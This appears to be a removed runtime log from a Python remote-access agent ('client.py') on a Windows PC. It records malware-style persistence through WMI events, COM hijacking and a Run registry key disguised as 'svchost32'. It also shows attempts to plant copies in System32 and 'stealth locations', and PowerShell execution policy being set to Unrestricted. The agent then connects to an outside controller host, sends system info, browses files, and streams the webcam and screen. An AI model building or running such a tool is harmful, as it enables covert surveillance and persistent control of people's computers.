-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,857 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,858 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [SKIP] Tamper protection disabled to prevent popup windows
-2025-12-28 06:28:04,858 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,859 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,860 - INFO - [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,860 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] system_level_persistence failed
-2025-12-28 06:28:04,861 - INFO - [WARN] system_level_persistence failed
-[INFO] [OK] WMI event persistence established
-2025-12-28 06:28:04,873 - INFO - [OK] WMI event persistence established
-[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-2025-12-28 06:28:04,874 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
-2025-12-28 06:28:04,875 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,877 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,881 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,885 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [SKIP] Tamper protection disabled to prevent popup windows
-2025-12-28 06:28:04,888 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,890 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,892 - INFO - [WARN] Failed to establish system persistence at C:\Windows\SysWOW64\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:04,893 - INFO - [WARN] Failed to establish system persistence at C:\Windows\System32\drivers\svchost32.exe: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] system_level_persistence failed
-2025-12-28 06:28:04,895 - INFO - [WARN] system_level_persistence failed
-[INFO] Initialization progress: [=====-] 5/6 tasks complete...
-2025-12-28 06:28:05,629 - INFO - Initialization progress: [=====-] 5/6 tasks complete...
-[INFO] [OK] WMI event persistence established
-2025-12-28 06:28:05,651 - INFO - [OK] WMI event persistence established
-[INFO] [OK] wmi_event_persistence established
-2025-12-28 06:28:05,652 - INFO - [OK] wmi_event_persistence established
-[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-2025-12-28 06:28:05,655 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-[INFO] [OK] com_hijacking_persistence established
-2025-12-28 06:28:05,656 - INFO - [OK] com_hijacking_persistence established
-[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
-2025-12-28 06:28:05,656 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
-[INFO] [WARN] file_locking_persistence failed
-2025-12-28 06:28:05,657 - INFO - [WARN] file_locking_persistence failed
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:05,660 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:05,668 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:05,688 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [SKIP] Tamper protection disabled to prevent popup windows
-2025-12-28 06:28:05,691 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
-[INFO] [WARN] tamper_protection_persistence failed
-2025-12-28 06:28:05,694 - INFO - [WARN] tamper_protection_persistence failed
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled
-2025-12-28 06:28:05,709 - INFO - [INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled
-[DEBUG] [REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)
-[INFO] Initialization progress: [=====-] 5/6 tasks complete
-2025-12-28 06:28:06,374 - INFO - Initialization progress: [=====-] 5/6 tasks complete
-[INFO] [OK] WMI event persistence established
-2025-12-28 06:28:06,463 - INFO - [OK] WMI event persistence established
-[INFO] [OK] wmi_event_persistence established
-2025-12-28 06:28:06,464 - INFO - [OK] wmi_event_persistence established
-[INFO] [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-2025-12-28 06:28:06,464 - INFO - [OK] COM hijacking persistence established: {00021401-0000-0000-C000-000000000046}
-[INFO] [OK] com_hijacking_persistence established
-2025-12-28 06:28:06,465 - INFO - [OK] com_hijacking_persistence established
-[INFO] [SKIP] Watchdog persistence disabled to prevent popup windows
-2025-12-28 06:28:06,467 - INFO - [SKIP] Watchdog persistence disabled to prevent popup windows
-[INFO] [WARN] file_locking_persistence failed
-2025-12-28 06:28:06,468 - INFO - [WARN] file_locking_persistence failed
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:06,469 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Roaming\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:06,470 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Microsoft\Windows\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-2025-12-28 06:28:06,472 - INFO - [WARN] Failed to create backup at C:\Users\Brylle\AppData\Local\Temp\svchost32.py: [WinError 123] The filename, directory name, or volume label syntax is incorrect
-[INFO] [SKIP] Tamper protection disabled to prevent popup windows
-2025-12-28 06:28:06,473 - INFO - [SKIP] Tamper protection disabled to prevent popup windows
-[INFO] [WARN] tamper_protection_persistence failed
-2025-12-28 06:28:06,473 - INFO - [WARN] tamper_protection_persistence failed
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[DEBUG] [OK] [ADMIN CHECK] Running as ADMINISTRATOR
-[INFO] [INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled
-2025-12-28 06:28:06,475 - INFO - [INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled
-[DEBUG] [REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)
-[DEBUG] [REGISTRY] [OK] CMD remains ENABLED (DisableCMD = 0)
-[DEBUG] [REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted
-[DEBUG] [REGISTRY] [OK] CMD remains ENABLED (DisableCMD = 0)
-[DEBUG] [REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted
-[DEBUG] [REGISTRY] [OK] PowerShell ExecutionPolicy set to Unrestricted
-[INFO] [OK] Removal tools registry entries configured (tools remain enabled)
-2025-12-28 06:28:06,812 - INFO - [OK] Removal tools registry entries configured (tools remain enabled)
-[INFO] [OK] Removal tools registry configured
-2025-12-28 06:28:06,813 - INFO - [OK] Removal tools registry configured
-[INFO] [OK] Advanced persistence setup complete: 2/5 methods successful
-2025-12-28 06:28:06,813 - INFO - [OK] Advanced persistence setup complete: 2/5 methods successful
-[INFO] [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:06,815 - INFO - [DEBUG] Running as Python script: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [INFO] Deploying to stealth location...
-2025-12-28 06:28:06,817 - INFO - [INFO] Deploying to stealth location...
-[WARNING] [WARN] Cannot deploy Python script as executable - run PyInstaller first
-2025-12-28 06:28:06,817 - WARNING - [WARN] Cannot deploy Python script as executable - run PyInstaller first
-[INFO] [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
-2025-12-28 06:28:06,820 - INFO - [ERROR] Failed to deploy to stealth location: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Local\\Microsoft\\Windows\\svchost32.bat'
-[INFO] [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:06,821 - INFO - [OK] Registry persistence established: "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:06,821 - INFO - [DEBUG] Registry entry verified: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [OK] Registry persistence exists: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-2025-12-28 06:28:06,822 - INFO - [OK] Registry persistence exists: svchost32 = "C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py"
-[INFO] [WARN] Target file does not exist: C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py
-2025-12-28 06:28:06,822 - INFO - [WARN] Target file does not exist: C:\Users\Brylle\AppData\Local\Programs\Python\Python313\python.exe" "C:\Users\Brylle\controller-ef5fecd17b20484d5f4acc58d78bf9d83da689ad\client.py
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:06,824 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:06,826 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [OK] Agent starting with ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:06,834 - INFO - [OK] Agent starting with ID: DESKTOP-8SOSPFT
-[INFO] Will notify controller (client-only) after connect
-2025-12-28 06:28:06,855 - INFO - Will notify controller (client-only) after connect
-[INFO] Initializing connection to server...
-2025-12-28 06:28:06,869 - INFO - Initializing connection to server...
-[INFO] Registering Socket.IO event handlers...
-2025-12-28 06:28:06,883 - INFO - Registering Socket.IO event handlers...
-[INFO] Socket.IO event handlers registered successfully
-2025-12-28 06:28:06,892 - INFO - Socket.IO event handlers registered successfully
-[INFO] [OK] Socket.IO event handlers registered (will persist across reconnections)
-2025-12-28 06:28:06,924 - INFO - [OK] Socket.IO event handlers registered (will persist across reconnections)
-[INFO] Starting connection health monitor...
-2025-12-28 06:28:06,926 - INFO - Starting connection health monitor...
-[DEBUG] [REGISTRY] [OK] PowerShell ExecutionPolicy set to Unrestricted
-[INFO] [OK] Removal tools registry entries configured (tools remain enabled)
-2025-12-28 06:28:06,933 - INFO - [OK] Removal tools registry entries configured (tools remain enabled)
-[INFO] [OK] Removal tools registry configured
-2025-12-28 06:28:06,937 - INFO - [OK] Removal tools registry configured
-[INFO] [OK] Advanced persistence setup complete: 2/5 methods successful
-2025-12-28 06:28:06,938 - INFO - [OK] Advanced persistence setup complete: 2/5 methods successful
-[INFO] Initialization progress: [=====-] 5/6 tasks complete.
-2025-12-28 06:28:06,939 - INFO - Initialization progress: [=====-] 5/6 tasks complete.
-[INFO] [HEALTH_MONITOR] Connection health monitor started
-2025-12-28 06:28:06,941 - INFO - [HEALTH_MONITOR] Connection health monitor started
-[INFO] [OK] Connection health monitor started (checks every 1 second)
-2025-12-28 06:28:06,945 - INFO - [OK] Connection health monitor started (checks every 1 second)
-[INFO] Connecting to server at https://agent-controller-backend.onrender.com (attempt 1)...
-2025-12-28 06:28:06,947 - INFO - Connecting to server at https://agent-controller-backend.onrender.com (attempt 1)...
-[INFO] Background initialization complete
-2025-12-28 06:28:07,039 - INFO - Background initialization complete
-[INFO] Initialization complete! All 6 tasks finished.
-2025-12-28 06:28:08,270 - INFO - Initialization complete! All 6 tasks finished.
-[INFO] [OK] Controller is reachable (HTTP 200)
-2025-12-28 06:28:09,293 - INFO - [OK] Controller is reachable (HTTP 200)
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:10,249 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:10,250 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
-2025-12-28 06:28:10,250 - INFO - [CONNECT] Connected to controller, registering agent DESKTOP-8SOSPFT
-[INFO] [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
-2025-12-28 06:28:10,271 - INFO - [HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...
-[INFO] [CLEANUP] Stopping all active operations...
-2025-12-28 06:28:10,272 - INFO - [CLEANUP] Stopping all active operations...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:10,272 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:10,273 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] WebRTC streaming stopped for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:10,278 - INFO - WebRTC streaming stopped for agent DESKTOP-8SOSPFT
-[INFO] [CLEANUP] WebRTC streaming stopped
-2025-12-28 06:28:10,278 - INFO - [CLEANUP] WebRTC streaming stopped
-[INFO] [CLEANUP] All operations stopped
-2025-12-28 06:28:10,279 - INFO - [CLEANUP] All operations stopped
-[INFO] [HEALTH_MONITOR] Triggering forced reconnection...
-2025-12-28 06:28:10,279 - INFO - [HEALTH_MONITOR] Triggering forced reconnection...
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:11,467 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:11,467 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Agent Connected (system)
-2025-12-28 06:28:11,468 - INFO - 📢 Notification emitted: Agent Connected (system)
-[INFO] [OK] Connected to server successfully!
-2025-12-28 06:28:11,468 - INFO - [OK] Connected to server successfully!
-[WARNING] Email not sent: missing Gmail credentials or recipient
-2025-12-28 06:28:11,469 - WARNING - Email not sent: missing Gmail credentials or recipient
-[INFO] [INFO] Event handlers already registered and active
-2025-12-28 06:28:11,469 - INFO - [INFO] Event handlers already registered and active
-[INFO] [INFO] Registering agent DESKTOP-8SOSPFT with controller...
-2025-12-28 06:28:11,469 - INFO - [INFO] Registering agent DESKTOP-8SOSPFT with controller...
-[INFO] [OK] Agent DESKTOP-8SOSPFT registration sent to controller
-2025-12-28 06:28:12,484 - INFO - [OK] Agent DESKTOP-8SOSPFT registration sent to controller
-[INFO] [OK] Agent system info sent to controller
-2025-12-28 06:28:12,484 - INFO - [OK] Agent system info sent to controller
-[INFO] [OK] Heartbeat started
-2025-12-28 06:28:12,485 - INFO - [OK] Heartbeat started
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:17,200 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:17,201 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [FILE_MANAGER] Browsing directory: /
-2025-12-28 06:28:18,722 - INFO - [FILE_MANAGER] Browsing directory: /
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:18,733 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:18,734 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Directory Listed (system)
-2025-12-28 06:28:18,735 - INFO - 📢 Notification emitted: Directory Listed (system)
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:22,274 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:22,275 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] CameraTrack initialized for agent DESKTOP-8SOSPFT at 30 FPS
-2025-12-28 06:28:35,094 - INFO - CameraTrack initialized for agent DESKTOP-8SOSPFT at 30 FPS
-[INFO] Added camera track to WebRTC connection for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:35,106 - INFO - Added camera track to WebRTC connection for agent DESKTOP-8SOSPFT
-[INFO] WebRTC peer connection created successfully for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:35,107 - INFO - WebRTC peer connection created successfully for agent DESKTOP-8SOSPFT
-[INFO] ICE gathering state: gathering for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:35,140 - INFO - ICE gathering state: gathering for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:35,142 - INFO - Connection(0) Could not bind to 169.254.255.5 - [WinError 10049] The requested address is not valid in its context
-2025-12-28 06:28:35,147 - INFO - Connection(0) Could not bind to 169.254.15.107 - [WinError 10049] The requested address is not valid in its context
-2025-12-28 06:28:35,147 - INFO - Connection(0) Could not bind to 169.254.175.61 - [WinError 10049] The requested address is not valid in its context
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:35,164 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:35,165 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:35,167 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:35,167 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] ICE gathering state: complete for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,155 - INFO - ICE gathering state: complete for agent DESKTOP-8SOSPFT
-[INFO] WebRTC offer created for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,156 - INFO - WebRTC offer created for agent DESKTOP-8SOSPFT
-[INFO] WebRTC offer sent to controller for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,156 - INFO - WebRTC offer sent to controller for agent DESKTOP-8SOSPFT
-[INFO] WebRTC streaming started for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,157 - INFO - WebRTC streaming started for agent DESKTOP-8SOSPFT
-[ERROR] Error closing WebRTC connection: Event loop is closed
-2025-12-28 06:28:40,161 - ERROR - Error closing WebRTC connection: Event loop is closed
-[INFO] ICE connection state: closed for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,161 - INFO - ICE connection state: closed for agent DESKTOP-8SOSPFT
-[INFO] WebRTC connection state changed to closed for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,161 - INFO - WebRTC connection state changed to closed for agent DESKTOP-8SOSPFT
-[ERROR] Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-2025-12-28 06:28:40,162 - ERROR - Failed to stop WebRTC streaming for agent DESKTOP-8SOSPFT
-[INFO] Camera 0 opened successfully
-2025-12-28 06:28:42,456 - INFO - Camera 0 opened successfully
-[INFO] Camera capture started
-2025-12-28 06:28:49,170 - INFO - Camera capture started
-[INFO] Started modern non-blocking camera stream at 20 FPS.
-2025-12-28 06:28:50,346 - INFO - Started modern non-blocking camera stream at 20 FPS.
-[INFO] Started Socket.IO camera stream (fallback mode).
-2025-12-28 06:28:50,347 - INFO - Started Socket.IO camera stream (fallback mode).
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:28:50,347 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:28:50,348 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] 📢 Notification emitted: Camera Stream Started (system)
-2025-12-28 06:28:50,348 - INFO - 📢 Notification emitted: Camera Stream Started (system)
-[INFO] Camera stream: 20.2 FPS, 0.6 MB/s, 102 frames total
-2025-12-28 06:28:55,381 - INFO - Camera stream: 20.2 FPS, 0.6 MB/s, 102 frames total
-[INFO] Camera stream: 19.9 FPS, 0.6 MB/s, 201 frames total
-2025-12-28 06:29:00,439 - INFO - Camera stream: 19.9 FPS, 0.6 MB/s, 201 frames total
-[INFO] Camera stream: 19.8 FPS, 0.6 MB/s, 300 frames total
-2025-12-28 06:29:05,476 - INFO - Camera stream: 19.8 FPS, 0.6 MB/s, 300 frames total
-[INFO] Camera stream: 19.8 FPS, 0.6 MB/s, 398 frames total
-2025-12-28 06:29:10,491 - INFO - Camera stream: 19.8 FPS, 0.6 MB/s, 398 frames total
-[INFO] Camera stream: 19.7 FPS, 0.6 MB/s, 497 frames total
-2025-12-28 06:29:15,528 - INFO - Camera stream: 19.7 FPS, 0.6 MB/s, 497 frames total
-[INFO] Camera stream: 19.7 FPS, 0.6 MB/s, 595 frames total
-2025-12-28 06:29:20,561 - INFO - Camera stream: 19.7 FPS, 0.6 MB/s, 595 frames total
-[INFO] Camera stream: 19.7 FPS, 0.6 MB/s, 694 frames total
-2025-12-28 06:29:25,606 - INFO - Camera stream: 19.7 FPS, 0.6 MB/s, 694 frames total
-[INFO] Camera stream: 19.7 FPS, 0.6 MB/s, 792 frames total
-2025-12-28 06:29:30,635 - INFO - Camera stream: 19.7 FPS, 0.6 MB/s, 792 frames total
-[INFO] Camera stream: 19.6 FPS, 0.6 MB/s, 889 frames total
-2025-12-28 06:29:35,680 - INFO - Camera stream: 19.6 FPS, 0.6 MB/s, 889 frames total
-[INFO] Camera stream: 19.4 FPS, 0.6 MB/s, 976 frames total
-2025-12-28 06:29:40,699 - INFO - Camera stream: 19.4 FPS, 0.6 MB/s, 976 frames total
-[INFO] Camera stream: 19.4 FPS, 0.6 MB/s, 1075 frames total
-2025-12-28 06:29:45,723 - INFO - Camera stream: 19.4 FPS, 0.6 MB/s, 1075 frames total
-[INFO] Camera stream: 19.4 FPS, 0.6 MB/s, 1174 frames total
-2025-12-28 06:29:50,764 - INFO - Camera stream: 19.4 FPS, 0.6 MB/s, 1174 frames total
-[INFO] Camera stream: 19.4 FPS, 0.6 MB/s, 1273 frames total
-2025-12-28 06:29:55,794 - INFO - Camera stream: 19.4 FPS, 0.6 MB/s, 1273 frames total
-[INFO] [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-2025-12-28 06:29:58,725 - INFO - [AGENT ID] Using hostname as agent ID: DESKTOP-8SOSPFT
-[WARNING] Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-2025-12-28 06:29:58,726 - WARNING - Could not save agent ID to file: [Errno 13] Permission denied: 'C:\\Users\\Brylle\\AppData\\Roaming\\agent_controller\\agent_id.txt'
-[INFO] ScreenTrack initialized for agent DESKTOP-8SOSPFT at 30 FPS
